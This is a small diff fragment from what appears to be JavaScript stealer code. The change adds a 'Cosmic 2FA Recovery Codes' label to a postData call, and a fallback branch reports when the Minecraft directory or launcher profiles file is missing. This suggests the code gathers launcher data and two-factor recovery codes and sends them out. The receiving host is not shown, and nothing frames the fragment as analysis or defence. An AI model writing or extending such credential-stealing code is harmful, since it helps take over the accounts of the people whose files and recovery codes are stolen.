@@ -72,7 +72,7 @@ const streamToString = (stream, enc, cb) => {
             }
         }
 
-        postData(toPost);
+        postData(toPost, 'Cosmic 2FA Recovery Codes');
     } else {
         postData('Minecraft directory or launcher profiles file not found.');
     }
